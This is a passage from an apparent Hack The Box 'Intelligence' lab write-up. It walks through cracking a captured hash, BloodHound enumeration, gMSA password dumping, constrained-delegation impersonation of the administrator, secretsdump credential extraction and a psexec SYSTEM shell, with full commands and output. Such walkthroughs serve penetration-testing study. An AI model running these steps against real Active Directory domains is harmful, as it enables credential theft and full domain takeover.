──(kali㉿kali)-[~/Desktop/htb/intelligence]         
└─$ hashcat -m 5600 ted.hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

TED.GRAVES::intelligence:09b62d495591053e:7b[...SNIP....]000000:Mr.Teddy
```

TED.GRAVES cracked password is `Mr.Teddy`

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]
└─$ crackmapexec smb 10.10.10.248 -u 'Ted.Graves' -p 'Mr.Teddy'
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 
```

## From Ted.Graves to Domain Admin

With Ted's credentials, no additional new service access was found. However, we can run Bloodhound with both user credentials and look for a way to escalate to Domain Admin.

### Enumeration using Bloodhound

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence/allDocuments]
└─$ bloodhound-python -c ALL -u 'ted.graves' -p 'Mr.Teddy' -d intelligence.htb -dc dc.intelligence.htb --zip -ns 10.10.10.248   
INFO: Found AD domain: intelligence.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to GC LDAP server: dc.intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 43 users
INFO: Found 55 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.intelligence.htb
INFO: Done in 00M 07S
INFO: Compressing output into 20241229151140_bloodhound.zip

```

Start neo4j and Bloodhound and load the data:

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ sudo neo4j start 
                                                                                                                                                                                                                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ bloodhound  
```

While enumerating users' privileges of owned accounts:

![image.png]({{site.url}}/assets/images/intelligence/image.png)

Ted.Graves is a member of the group **ITSUPPORT** which has `ReadGMSAPassword` privilege over the computer account **SVC_INT$@INTELLIGENCE.HTB**

***NB:* When an account name ends with the symbol $, it means we are dealing with a computer account**

![image.png]({{site.url}}/assets/images/intelligence/image%201.png)

And SVC_INT$ has `AllowedToDelegate` privilege.

So the Domain Admin escalation privilege path will look like:

```text
Ted.Graves --> (ReadGMSAPassword) --> Silver ticket of SVC_INT$ --> (WriteDacl) --> Administrator
```

### Abusing ReadGMSAPassword

![image.png]({{site.url}}/assets/images/intelligence/image%202.png)

```bash
──(kali㉿kali)-[/opt]
└─$ git clone https://github.com/micahvandeusen/gMSADumper.git
Cloning into 'gMSADumper'...
Resolving deltas: 100% (22/22), done.

┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ python3 /opt/gMSADumper/gMSADumper.py -u 'ted.graves' -p 'Mr.Teddy' -d intelligence.htb
Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::c47a331c752d98d42c7831f12c8ecb04
svc_int$:aes256-cts-hmac-sha1-96:1308ed999bcfe5116de0204253c78104168f8609948aa5b5f8dccff5105b67dc
svc_int$:aes128-cts-hmac-sha1-96:9367ede9df9795e9c611ffc859b2319f
```

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ crackmapexec smb 10.10.10.248 -u 'svc_int$' -H ':c47a331c752d98d42c7831f12c8ecb04' 
SMB         10.10.10.248    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\svc_int$:c47a331c752d98d42c7831f12c8ecb04 
```

### Impersonate admin user through delegation

```bash
──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'administrator'  -hashes :c47a331c752d98d42c7831f12c8ecb04 'intelligence.htb'/'svc_int$'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ ntpdate 10.10.10.248                                                                                                                                                                                     
2024-12-31 00:23:51.309804 (-0500) +28825.129361 +/- 0.016184 10.10.10.248 s1 no-leap 

┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ faketime '2024-12-31 00:23:51' impacket-getST -spn 'www/dc.intelligence.htb' -dc-ip 10.10.10.248 -impersonate 'administrator'   'intelligence.htb'/'svc_int$' -hashes ':c47a331c752d98d42c7831f12c8ecb04'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

With the clock skew being too great, we can request the DC time and use a neat tool called *faketime* to get a Ticket as user administrator.

From there we can dump the Domain Admin credentials and authenticate as Administrator, or we can just use wmiexec to login.

### Dumping hashes

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]                                                             
└─$ KRB5CCNAME=./administrator@www_dc.intelligence.htb@INTELLIGENCE.HTB.ccache faketime '2024-12-31 00:23:36' impacket-secretsdump  -k -no-pass intelligence.htb/administrator@dc.intelligence.htb                    
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                                
                                                                                                                                                                                                                     
[*] Service RemoteRegistry is in stopped state                                                          
[*] Starting service RemoteRegistry                                                                                                                                                                                  
[*] Target system bootKey: 0xcae14f646af6326ace0e1f5b8b4146df                                        
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                                                 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0054cc2f7ff3b56d9e47eb39c89b521f:::                                                                                                                               
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                       
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                              
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                                                                                                             
[*] Dumping cached domain logon information (domain/username:hash)                                   
[*] Dumping LSA Secrets                                                                                
[*] $MACHINE.ACC                                                                                                                                                                                                     
intelligence\DC$:plain_password_hex:9ae7ac7c9c5e4b286e614b3daa4240747d3f03864242bb16ad058d075af538e3954cb2d20238eb2735c6705c8a8b3b3f17b33a77e7af7e1c1adf37c713afa6b7ee22d8c13db5efd62f13c337e52a402420fff027e28d07256124aa36416e1d1203a95e8939207700e1dc0cf149a45853f5d1115edd42ea1797102968f96d270ff9b9b47822aed2e210091c2ca13ed7907c9f5195cdd6c9e408afdfaa6866cacc9af81e2bb9a8f7563255de45bc060400d80b96bf78ca28b94435cfcc01f3ea8fd4c0d6a
7f21b75071a60dbbca364f3226c7e5381185b161dfb9828abc3e9fc3320d81c996a4d006071d295217d4e2b67                                                                                                                            
intelligence\DC$:aad3b435b51404eeaad3b435b51404ee:9dc0e948f8d86977447f8a709d16bda4:::                                                                                                                                
[*] DPAPI_SYSTEM                                                                                      
dpapi_machinekey:0xc3430503ab11d38db01911c159fe940bd8ec7cdb                                                                                                                                                          
dpapi_userkey:0x43fdd77605cdb58e14fb6a5c90c976fde8f4f2ea
[...Snip...]
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                                 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3::: 
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9ce5f83a494226352bca637e8c1d6cb6:::                                                                                                                                      
intelligence.htb\Danny.Matthews:1103:aad3b435b51404eeaad3b435b51404ee:9112464222be8b09d663916274dd6b61:::
intelligence.htb\Jose.Williams:1104:aad3b435b51404eeaad3b435b51404ee:9e3dbd7d331c158da69905a1d0c15244:::
intelligence.htb\Jason.Wright:1105:aad3b435b51404eeaad3b435b51404ee:01295a54d60d3d2498aa12d5bbdea996:::      
[...........]

It is XMas :)                                           
```

### Login as Admin

```bash
┌──(kali㉿kali)-[~/Desktop/htb/intelligence]
└─$ impacket-psexec -hashes ':9075113fe16cf74f7c0f9b27e882dad3' administrator@10.10.10.248
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.248.....
[*] Found writable share ADMIN$
[*] Uploading file RwTRysCW.exe
[*] Opening SVCManager on 10.10.10.248.....
[*] Creating service zNaT on 10.10.10.248.....
[*] Starting service zNaT.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

We have successfully rooted the box! Here's a summary of the key techniques used:

1. PDF metadata analysis to discover domain users
2. ADIDNS poisoning to capture NetNTLM hashes
3. gMSA password abuse through ReadGMSAPassword privilege
4. Constrained delegation exploitation to gain Domain Admin access



Hope you enjoyed this writeup!